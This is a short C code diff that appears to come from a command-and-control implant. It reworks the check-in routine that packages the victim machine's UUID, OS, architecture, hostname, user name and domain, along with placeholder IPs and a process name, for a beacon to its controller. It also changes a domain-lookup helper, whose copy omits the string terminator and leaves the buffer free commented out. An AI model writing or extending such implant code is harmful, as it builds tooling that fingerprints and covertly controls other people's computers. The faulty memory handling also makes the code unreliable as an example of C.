@@ -49,21 +49,22 @@ char* getUserName()
 	return (char*)userName;
 }
 
-LPWSTR getDomain()
+LPWSTR getDomain(PWCHAR *domain)
 {
 	DWORD dwLevel = 102;
 	LPWKSTA_INFO_102 pBuf = NULL;
 	NET_API_STATUS nStatus;
 	LPWSTR pszServerName = NULL;
-	LPWSTR domain = NULL;
 	nStatus = NetWkstaGetInfo(pszServerName, dwLevel, (LPBYTE*)&pBuf);
 	if (nStatus == NERR_Success)
 	{
-		domain = pBuf->wki102_langroup;
+		DWORD length = lstrlenW(pBuf->wki102_langroup);
+		*domain = (PWCHAR)LocalAlloc(LPTR, sizeof(WCHAR) * length);
+		memcpy(*domain, pBuf->wki102_langroup, sizeof(WCHAR) * length);
 	}
 	/*if (pBuf != NULL)
 		NetApiBufferFree(pBuf);*/
-	return domain;
+	return *domain;
 }
 
 char* getOsName()
@@ -74,16 +75,19 @@ char* getOsName()
 
 BOOL checkin()
 {
-	PPackage checkin = newPackage(0, FALSE);
+	PPackage checkin = newPackage(0, TRUE);
+	addByte(checkin, 0xf1);
 	addString(checkin, (PCHAR)uuid, FALSE);
-	//addInt32(checkin, 1);
+	addInt32(checkin, 1);
 	addString(checkin, (PCHAR)"192.168.50.1", TRUE);
 	
 	addString(checkin, getOsName(), TRUE);
 	addByte(checkin, getArch());
 	addString(checkin, getHostname(), TRUE);
 	addString(checkin, getUserName(), TRUE);
-	addWString(checkin, getDomain(), TRUE);
+	PWCHAR domain = NULL;
+	getDomain(&domain);
+	addWString(checkin,domain, TRUE);
 	addInt32(checkin, 0);
 	addString(checkin, (PCHAR)"Test.exe", TRUE);
 	addString(checkin, (PCHAR)"1.1.1.1", TRUE);
